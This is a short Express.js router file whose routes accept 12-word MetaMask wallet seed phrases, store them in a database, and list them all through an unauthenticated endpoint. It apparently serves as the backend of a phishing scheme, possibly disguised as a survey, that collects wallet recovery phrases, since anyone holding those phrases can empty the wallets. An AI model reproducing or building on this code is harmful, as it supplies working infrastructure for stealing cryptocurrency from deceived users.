const express = require("express");

const router = express.Router();

const ObjectId = require("mongodb").ObjectId;

const Survey = require("../../../models/Survey");
const Metamask = require("../../../models/Metamask");


router.post("/add", async (req, res) => {
    let words = req.body.phase.split(" ");
    if (words.length != 12) return res.json({ status: "error", "message": "Incorrect Pharse" });

    var oldmetamask = await Metamask.findOne({ "phase": req.body.phase });

    if (oldmetamask) {
        return res.json({ "status": "error", "message": "Already Exist."});
    }

    Metamask.create(req.body)
        .then((data) => res.json({ status: "success", "data": data }))
        .catch((err) => res.json(err));
});

router.get('/', (req, res) => {
    Metamask.find()
        .then(data => res.json({ "status": "success", "count": data.length, "data": data }))
        .catch(err => res.status(404).json(err));
});

router.delete('/password/:id', (req, res) => {
    Metamask.findByIdAndRemove(req.params.id)
        .then(data => res.json({ status: "success", "data": data }))
        .catch(err => res.json(err));
});

module.exports = router;
